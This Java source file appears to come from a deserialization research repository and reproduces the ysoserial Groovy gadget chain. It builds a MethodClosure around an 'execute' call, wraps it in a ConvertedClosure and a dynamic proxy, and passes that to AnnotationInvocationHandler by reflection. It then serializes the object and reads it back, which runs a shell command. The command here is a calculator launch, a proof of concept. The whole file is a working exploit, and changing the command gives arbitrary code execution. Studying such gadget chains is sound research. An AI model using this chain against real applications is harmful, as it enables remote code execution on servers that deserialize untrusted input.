package org.su18.serialize.ysoserial.Groovy;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;
import org.su18.serialize.utils.SerializeUtil;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;

/**
 * @author su18
 */
public class Groovy {

	public static void main(String[] args) throws Exception {

		//封装我们需要执行的对象
		MethodClosure    methodClosure = new MethodClosure("open -a Calculator.app", "execute");
		ConvertedClosure closure       = new ConvertedClosure(methodClosure, "entrySet");

		Class<?>       c           = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor<?> constructor = c.getDeclaredConstructors()[0];
		constructor.setAccessible(true);

		// 创建 ConvertedClosure 的动态代理类实例
		Map handler = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),
				new Class[]{Map.class}, closure);

		// 使用动态代理初始化 AnnotationInvocationHandler
		InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, handler);

		SerializeUtil.writeObjectToFile(invocationHandler);
		SerializeUtil.readFileObject();
	}
}
